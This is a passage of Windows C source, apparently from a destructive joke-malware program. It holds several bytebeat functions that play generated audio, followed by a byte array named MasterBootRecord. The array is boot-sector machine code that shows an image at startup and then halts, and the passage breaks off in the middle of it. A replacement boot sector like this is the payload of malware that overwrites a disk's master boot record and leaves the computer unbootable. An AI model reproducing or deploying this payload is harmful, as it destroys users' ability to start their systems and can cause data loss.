	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 24444, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(128 * sin((t * (t >> 6 & t >> 13) / 26) + (t / 169)) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((sin(t * (t >> 6 & t >> 13) / 26) + tan(t / 169))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((tan(t * (t >> 6 & t >> 13) / 26) + log(t / 169))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat15() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((cbrt(t * (t >> 6 & t + 13) / 26) + (t & 169)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat16() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((log(t * (t >> 6 & t + 13) / 26) + (t & 169)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat17() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((((((cbrt(t * (t >> 6 & t + 13) / 26) * sin(t / 169)))))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat18() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((cbrt(t * (t >> 6 & t + 13) / 26) + sin(t / 169))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
const unsigned char MasterBootRecord[] = { 0xBB,0xE0,0x07,0x8E,0xC3,0x8E,0xDB,0xB8,0x16,0x02,0xB9,0x02,0x00,0xB6,0x00,0xBB,0x00,0x00,0xCD,0x13,0x31,0xC0,0x89,0xC3,0x89,0xC1,0x89,0xC2,0xBE,0x00,0x00,0xBF,0xD9,0x0C,0xAC,0x81,0xFE,0xD9,0x0C,0x73,0x31,0x3C,0x80,0x73,0x02,0xEB,0x0F,0x24,0x7F,0x88,0xC1,0xAC,0xAA,0xFE,0xC9,0x80,0xF9,0xFF,0x75,0xF7,0xEB,0xE4,0xB4,0x00,0x3C,0x40,0x72,0x05,0x24,0x3F,0x88,0xC4,0xAC,0x89,0xC1,0xAD,0x89,0xF2,0x89,0xFE,0x29,0xC6,0xAC,0xAA,0xE2,0xFC,0x89,0xD6,0xEB,0xC8,0xB8,0x13,0x00,0xCD,0x10,0xBB,0xE0,0x07,0x8E,0xDB,0xBE,0xD9,0x0C,0xB4,0x00,0xAC,0xBB,0x00,0x00,0x89,0xC1,0xBA,0xC8,0x03,0x88,0xD8,0xEE,0x43,0xBA,0xC9,0x03,0xAC,0xEE,0xAC,0xEE,0xAC,0xEE,0xE2,0xEE,0xBB,0x00,0xA0,0x8E,0xC3,0xBF,0x00,0x00,0xB9,0x00,0x7D,0xF3,0xA5,0xF4,0xEB,0xFD,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA,0xFF,0x46,0x3B,0x07,0x09,0x2E,0x2C,0x2C,0x33,0x31,0x31,0x33,0x31,0x31,0x15,0x15,0x15,0x28,0x26,0x26,0x38,0x35,0x35,0x2A,0x28,0x28,0x2D,0x27,0x27,0x0F,0x0F,0x0F,0x2F,0x2D,0x2D,0x32,0x30,0x30,0x17,0x17,0x17,0x04,0x04,0x04,0x19,0x19,0x19,0x21,0x21,0x21,0x13,0x13,0x13,0x1C,0x1C,0x1C,0x19,0x19,0x19,0x2E,0x2C,0x2C,0x35,0x34,0x34,0x2E,0x2D,0x2D,0x30,0x2C,0x2C,0x20,0x20,0x20,0x2E,0x2C,0x2C,0x1F,0x1E,0x1E,0x04,0x04,0x04,0x0C,0x08,0x08,0x11,0x11,0x11,0x01,0x01,0x01,0x3C,0x39,0x39,0x36,0x33,0x33,0x15,0x15,0x15,0x11,0x10,0x10,0x27,0x25,0x25,0x20,0x20,0x20,0x30,0x2F,0x2F,0x18,0x18,0x18,0x35,0x20,0x20,0x2C,0x2A,0x2A,0x14,0x14,0x14,0x0A,0x0A,0x0A,0x28,0xE2,0x28,0x28,0x25,0x24,0x24,0x30,0x2E,0x2E,0x07,0x06,0x06,0x1F,0x1F,0x1F,0x18,0x18,0x18,0x18,0x18,0x18,0x21,0x21,0x21,0x14,0x13,0x13,0x30,0x2F,0x2F,0x2F,0x2E,0x2E,0x0C,0x0C,0x0C,0x13,0x13,0x13,0x1D,0x1D,0x1D,0x23,0x22,0x22,0x06,0x06,0x06,0x2B,0x12,0x12,0x2E,0x2C,0x2C,0x09,0x03,0x03,0x18,0x17,0x17,0x33,0x31,0x31,0x1F,0x1F,0x1F,0x03,0x03,0x03,0x13,0x12,0x12,0x31,0x2F,0x2F,0x21,0x20,0x20,0x29,0x27,0x27,0x13,0x12,0x12,0x1D,0x1D,0x1D,0x1D,0x05,0x05,0x05,0x05,0x05,0x1E,0x1E,0x1E,0x1E,0x06,0x06,0x06,0x05,0x5A,0x00,0xBD,0x1F,0x01,0x01,0x01,0x01,0x08,0x08,0x08,0x08,0x08,0x26,0x26,0x26,0x26,0x3A,0x3A,0x3A,0x3A,0x1B,0x1B,0x1B,0x1B,0x1B,0x3C,0x3C,0x3C,0x3C,0x16,0x16,0x16,0x16,0x16,0x33,0x33,0x33,0x33,0x34,0x34,0x34,0x34,0x15,0x15,0x15,0x15,0x15,0x3B,0x3B,0x3B,0x3B,0x0A,0x0A,0x0A,0x0A,0x0A,0x24,0x24,0x24,0x24,0x02,0x02,0x02,0x02,0x04,0x04,0x00,0x84,0x02,0x03,0x03,0x03,0x03,0x04,0x04,0x00,0x95,0x0B,0x0B,0x0B,0x0B,0x0B,0x27,0x27,0x27,0x27,0x13,0x13,0x13,0x13,0x13,0x42,0x42,0x42,0x42,0x44,0x44,0x44,0x44,0x04,0x60,0x00,0x91,0x01,0x3E,0x3E,0x3E,0x3E,0x14,0x14,0x14,0x14,0x14,0x2C,0x2C,0x2C,0x2C,0x2B,0x2B,0x2B,0x2B,0x05,0xD0,0x00,0xFE,0x39,0x39,0x39,0x39,0x45,0x45,0x45,0x45,0x10,0x10,0x10,0x10,0x10,0x41,0x41,0x41,0x41,0x1C,0x1C,0x1C,0x1C,0x1C,0x36,0x36,0x36,0x36,0x38,0x38,0x38,0x38,0x17,0x17,0x17,0x17,0x17,0x3D,0x3D,0x3D,0x3D,0x37,0x37,0x37,0x37,0x19,0x19,0x19,0x19,0x19,0x3F,0x3F,0x3F,0x3F,0x23,0x23,0x23,0x23,0x23,0x43,0x43,0x43,0x43,0x31,0x31,0x31,0x31,0x0F,0x0F,0x0F,0x0F,0x0F,0x2E,0x2E,0x2E,0x2E,0x12,0x12,0x12,0x12,0x12,0x35,0x35,0x35,0x35,0x40,0x40,0x40,0x40,0x1A,0x1A,0x1A,0x1A,0x1A,0x2D,0x2D,0x2D,0x2D,0x29,0x29,0x29,0x29,0x09,0x09,0x09,0x09,0x09,0x20,0x20,0x20,0x20,0x32,0x32,0x32,0x32,0x32,0x04,0x04,0x04,0x04,0x25,0x25,0x25,0x25,0x0E,0x0E,0x0E,0x0E,0x0E,0x04,0x0D,0x00,0x94,0x0D,0x0D,0x0D,0x0D,0x0D,0x28,0x28,0x28,0x28,0x2A,0x2A,0x2A,0x2A,0x0C,0x0C,0x0C,0x0C,0x0C,0x30,0x30,0x30,0x04,0x62,0x01,0x92,0x2F,0x11,0x11,0x11,0x11,0x11,0x22,0x22,0x22,0x22,0x07,0x07,0x07,0x07,0x07,0x21,0x21,0x21,0x21,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x45,0x00,0x00,0x05,0x4A,0x00,0x00,0x0A,0x54,0x00,0x00,0x14,0x4A,0x38,0x40,0x0B,0x83,0x00,0x00,0x00,0x00,0x04,0x04,0x00,0x05,0x05,0x00,0x41,0x31,0x40,0x01,0x0D,0x3E,0x01,0x05,0x05,0x00,0x41,0x2C,0x40,0x01,0x12,0x3E,0x01,0x08,0x08,0x00,0x40,0x76,0x40,0x01,0x1A,0x90,0x00,0x0E,0x0E,0x00,0x40,0x87,0x40,0x01,0x05,0x8C,0x00,0x0C,0x00,0x05,0x0B,0xA3,0x00,0x41,0x23,0x40,0x01,0x05,0x3E,0x01,0x10,0x40,0x06,0x11,0x41,0x01,0x41,0x19,0x40,0x01,0x07,0x3F,0x01,0x12,0x80,0x07,0x0E,0x43,0x01,0x2A,0x40,0x01,0x0C,0xE2,0x00,0x27,0x40,0x01,0x81,0x00,0x00,0x10,0x40,0x01,0x21,0x00,0x05,0x17,0x40,0x01,0x81,0x00,0x00,0x40,0x6F,0x40,0x01,0x06,0xBD,0x03,0x17,0xC0,0x08,0x0B,0x41,0x01,0x26,0x40,0x01,0x11,0x23,0x02,0x23,0x40,0x01,0x06,0x29,0x00,0x30,0x40,0x01,0x82,0x1A,0x00,0x00,0x13,0x40,0x06,0x04,0x4A,0x00,0x40,0x6D,0x40,0x01,0x04,0x71,0x00,0x1D,0x00,0x0A,0x08,0x42,0x01,0x20,0x40,0x01,0x17,0x63,0x03,0x1D,0x40,0x01,0x0C,0x29,0x00,0x10,0xC0,0x03,0x36,0x80,0x07,0x40,0x92,0x40,0x01,0x80,0x02,0x06,0x42,0x01,0x1E,0x40,0x01,0x0E,0x34,0x01,0x09,0x00,0x05,0x1A,0xC0,0x03,0x12,0x69,0x01,0x40,0xB6,0x40,0x01,0x05,0xBB,0x00,0x24,0x40,0x01,0x80,0x00,0x1B,0x40,0x01,0x0D,0x3C,0x01,0x1F,0x40,0x06,0x13,0xA3,0x02,0x15,0x00,0x05,0x40,0xAB,0x40,0x01,0x22,0xC0,0x0D,0x0C,0x40,0x01,0x1C,0x10,0x07,0x19,0x80,0x07,0x83,0x00,0x00,0x00,0x45,0x15,0x32,0x00,0x1A,0x80,0x07,0x37,0x40,0x0B,0x04,0x3B,0x00,0x40,0x9C,0x40,0x01,0x19,0x3C,0x01,0x1C,0xC0,0x08,0x18,0x34,0x00,0x1C,0xC0,0x08,0x40,0xCC,0x40,0x01,0x0C,0x80,0x07,0x15,0x09,0x01,0x20,0x00,0x0A,0x0A,0x2A,0x00,0x2A,0x00,0x0A,0x40,0xD7,0x40,0x01,0x11,0x00,0x05,0x08,0x7E,0x02,0x21,0x40,0x01,0x2B,0x00,0x0F,0x41,0x14,0x40,0x01,0x2C,0x40,0x10,0x40,0xAC,0x40,0x01,0x40,0x41,0x00,0x14,0x41,0x40,0x40,0x01,0x04,0xC0,0x08,0x40,0x89,0x40,0x01,0x08,0x41,0x01,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x42,0x42,0x80,0x02,0x80,0x00,0x41,0x3B,0x40,0x01,0x80,0x23,0x41,0x40,0x40,0x01,0x40,0xAB,0x40,0x01,0x40,0x40,0x80,0x0C,0x41,0x40,0x40,0x01,0x40,0x54,0x80,0x0C,0x40,0xF0,0x40,0x01,0x24,0x80,0x11,0x2E,0x40,0x1F,0x07,0x41,0x01,0x33,0x40,0x1F,0x40,0x6D,0x40,0x01,0x07,0x81,0x16,0x41,0x3A,0x40,0x01,0x06,0x82,0x02,0x41,0x3B,0x40,0x01,0x1A,0x00,0x1E,0x40,0xBA,0x40,0x01,0x80,0x00,0x41,0x3C,0x40,0x01,0x06,0x81,0x02,0x40,0x6E,0xC0,0x21,0x41,0x3D,0x40,0x01,0x07,0x82,0x02,0x3C,0x80,0x16,0x40,0x4F,0x40,0x01,0x15,0x64,0x19,0x40,0x9A,0x40,0x01,0x06,0x41,0x01,0x40,0xA0,0x40,0x01,0x05,0x05,0x00,0x27,0x40,0x01,0x80,0x00,0x40,0x6F,0x40,0x29,0x40,0xA9,0x40,0x01,0x05,0x05,0x00,0x20,0x40,0x29,0x40,0x75,0x40,0x01,0x81,0x00,0x00,0x40,0x8A,0x40,0x01,0x24,0xC1,0x26,0x40,0x92,0x40,0x01,0x80,0x00,0x40,0x8A,0x40,0x01,0x80,0x23,0x05,0x41,0x06,0x0D,0x40,0x06,0x15,0x45,0x01,0x40,0x88,0x40,0x01,0x08,0x40,0x2E,0x40,0x9B,0x40,0x01,0x0A,0x80,0x07,0x13,0x48,0x01,0x40,0x83,0x40,0x01,0x05,0x41,0x01,0x40,0xA5,0x40,0x01,0x05,0x40,0x06,0x40,0x92,0x40,0x01,0x81,0x34,0x34,0x07,0x41,0x01,0x40,0x89,0x40,0x01,0x80,0x00,0x21,0x00,0x0A,0x40,0x91,0x40,0x01,0x04,0x41,0x01,0x40,0x86,0x40,0x01,0x06,0x81,0x02,0x25,0x40,0x0B,0x40,0x88,0x40,0x01,0x07,0x41,0x01,0x40,0xB1,0x40,0x01,0x40,0x85,0x40,0x06,0x05,0x00,0x0A,0x05,0x41,0x01,0x41,0x3F,0x40,0x01,0x80,0x00,0x40,0x87,0x40,0x01,0x05,0x41,0x01,0x40,0xAF,0x40,0x01,0x80,0x15,0x40,0x56,0x40,0x01,0x21,0x0D,0x0B,0x40,0xC9,0x40,0x01,0x08,0x41,0x01,0x40,0x6F,0x40,0x01,0x0F,0x40,0x2E,0x41,0x34,0x40,0x01,0x05,0x05,0x00,0x40,0xC2,0x40,0x01,0x07,0x41,0x01,0x40,0x6E,0x00,0x05,0x10,0x47,0x01,0x41,0x30,0x40,0x01,0x82,0x3D,0x3D,0x3D,0x41,0x40,0x40,0x01,0x06,0x40,0x06,0x40,0xC3,0x40,0x01,0x04,0x41,0x01,0x40,0x7E,0xC0,0x08,0x41,0x40,0x40,0x01,0x40,0xBE,0x40,0x06,0x41,0x40,0x40,0x01,0x42,0x80,0x80,0x02,0x42,0x5D,0x80,0x02,0x82,0x00,0x00,0x00,0x41,0x40,0x40,0x01,0x41,0x40,0x40,0x01,0x80,0x00,0x41,0x40,0x40,0x01,0x40,0x9C,0xC0,0x0D,0x40,0xA1,0x40,0x06,0x05,0x41,0x01,0x41,0x3B,0x40,0x01,0x81,0x08,0x26,0x05,0xA1,0x0F,0x40,0x6F,0x00,0x14,0x40,0xD1,0x40,0x01,0x81,0x00,0x00,0x41,0x39,0x40,0x01,0x0C,0x41,0x01,0x40,0x68,0x00,0x19,0x40,0xCF,0x40,0x0B,0x09,0xA8,0x14,0x41,0x38,0x80,0x1B,0x0A,0xEA,0x15,0x11,0x80,0x20,0x40,0x8A,0x00,0x1E,0x40,0x9E,0xC0,0x0D,0x18,0xC2,0x19,0x37,0x40,0x42,0x05,0x81,0x34,0x1D,0x40,0x1A,0x32,0x80,0x52,0x40,0xA2,0x00,0x0F,0x15,0x3F,0x01,0x40,0xEF,0x40,0x01,0x82,0x00,0x00,0x00,0x40,0x40,0x00,0x4B,0x09,0x3E,0x01,0x40,0x58,0xC0,0x44,0x35,0x40,0x01,0x40,0x63,0xC0,0x21,0x08,0xF8,0x00,0x40,0x7D,0xC0,0x58,0x40,0xB7,0x40,0x01,0x0C,0x38,0x02,0x40,0x81,0x40,0x01,0x23,0x40,0x1F,0x0C,0x40,0x01,0x1F,0x46,0x1F,0x40,0x48,0x40,0x01,0x28,0xB6,0x1F,0x40,0x7E,0x40,0x5B,0x40,0x4C,0x80,0x20,0x0C,0xC0,0x1C,0x3D,0x40,0x01,0x26,0x68,0x00,0x40,0x85,0x80,0x5C,0x22,0x40,0x01,0x31,0x3F,0x01,0x25,0x40,0x01,0x08,0x42,0x2E,0x38,0x40,0x01,0x40,0x88,0xC0,0x5D,0x1F,0x40,0x01,0x15,0xBC,0x00,0x40,0x41,0x00,0x05,0x0B,0x83,0x2F,0x1A,0x40,0x01,0x40,0xA7,0x00,0x5F,0x81,0x00,0x00,0x1B,0xC0,0x58,0x11,0x3B,0x01,0x40,0x40,0x00,0x2D,0x11,0xC3,0x30,0x13,0xC0,0x58,0x82,0x00,0x00,0x00,0x40,0xC8,0x40,0x60,0x09,0xE8,0x00,0x30,0x80,0x07,0x0B,0x80,0x2F,0x1C,0x86,0x03,0x40,0xE3,0x80,0x61,0x06,0x3F,0x01,0x33,0x40,0x01,0x1B,0x37,0x01,0x40,0xEC,0xC0,0x62,0x40,0x4F,0x40,0x01,0x40,0xF1,0x00,0x64,0x35,0x40,0x01,0x0C,0x32,0x01,0x40,0xFF,0x40,0x65,0x06,0x3F,0x01,0x2E,0x40,0x01,0x09,0x3C,0x01,0x41,0x04,0x80,0x66,0x05,0x3F,0x01,0x34,0x40,0x01,0x40,0x96,0x00,0x64,0x04,0xFF,0x18,0x40,0xA0,0xC0,0x67,0x08,0x41,0x4C,0x40,0x93,0x40,0x01,0x1E,0x40,0x1A,0x40,0x88,0x00,0x69,0x40,0x9E,0x40,0x01,0x80,0x00,0x04,0x40,0x01,0x19,0xE2,0x06,0x40,0x85,0x40,0x6A,0x40,0xA1,0x40,0x01,0x1B,0x5E,0x09,0x41,0x1E,0x80,0x6B,0x22,0x40,0x01,0x41,0x1E,0x80,0x6B,0x08,0xC0,0x03,0x18,0x00,0x05,0x07,0x7E,0x6B,0x41,0x40,0x40,0x01,0x41,0x1A,0xC0,0x6C,0x1C,0x80,0x20,0x04,0x80,0x07,0x41,0x40,0x40,0x01,0x41,0xA5,0x80,0x02,0x1C,0x00,0x64,0x40,0xA0,0x80,0x70,0x40,0x4C,0x40,0x01,0x05,0x7F,0x16,0x2D,0x40,0x01,0x04,0x7F,0x16,0x08,0x43,0x1A,0x40,0xE5,0x40,0x01,0x05,0xC1,0x6C,0x40,0x49,0x40,0x01,0x06,0xC0,0x17,0x0A,0xFD,0x68,0x40,0xD1,0x40,0x01,0x10,0x80,0x07,0x1E,0xC0,0x6C,0x0D,0x40,0x01,0x07,0x41,0x6A,0x2B,0x40,0x01,0x05,0x42,0x01,0x40,0xD1,0x40,0x01,0x11,0x80,0x6B,0x26,0x40,0x01,0x08,0x82,0x6B,0x20,0xC0,0x03,0x81,0x00,0x00,0x04,0x40,0x01,0x08,0x00,0x6E,0x40,0xCF,0x40,0x01,0x11,0x80,0x0C,0x40,0x57,0x40,0x01,0x05,0x80,0x07,0x06,0x41,0x01,0x0C,0x40,0x01,0x04,0xBF,0x1C,0x40,0xA1,0xC0,0x76,0x1D,0x40,0x29,0x10,0x00,0x0F,0x29,0x40,0x01,0x09,0x02,0x6E,0x23,0x40,0x01,0x09,0xC0,0x08,0x0F,0x40,0x42,0x0A,0x00,0x1E,0x40,0xB3,0x40,0x01,0x16,0x80,0x11,0x06,0x01,0x73,0x40,0x58,0x40,0x01,0x05,0x41,0x01,0x40,0xCC,0x40,0x01,0x14,0x80,0x70,0x25,0x40,0x01,0x0A,0x82,0x70,0x2D,0x40,0x01,0x04,0x41,0x01,0x40,0xC2,0x40,0x01,0x0B,0x02,0x28,0x0F,0x40,0x01,0x07,0x81,0x75,0x40,0xAD,0x40,0x01,0x06,0x41,0x1F,0x40,0x63,0x40,0x01,0x23,0x40,0x29,0x1E,0xC0,0x76,0x06,0x3F,0x01,0x1A,0x40,0x01,0x81,0x00,0x00,0x40,0x73,0x40,0x01,0x40,0x61,0xC0,0x21,0x17,0x40,0x01,0x15,0xC0,0x17,0x1D,0x40,0x01,0x06,0x7E,0x70,0x08,0xC0,0x76,0x05,0x81,0x07,0x0C,0x40,0x01,0x05,0x1F,0x00,0x40,0x70,0x40,0x01,0x0A,0xD0,0x00,0x40,0x59,0x80,0x2A,0x13,0x40,0x01,0x19,0x00,0x19,0x21,0x40,0x01,0x0A,0x00,0x78,0x40,0x89,0x40,0x01,0x05,0xC2,0x03,0x06,0x41,0x01,0x1F,0x40,0x01,0x36,0x40,0x29,0x19,0xC0,0x08,0x40,0x4E,0x40,0x01,0x06,0xC5,0x00,0x40,0x75,0x40,0x01,0x07,0x3F,0x29,0x40,0x57,0x40,0x01,0x07,0x41,0x01,0x24,0x40,0x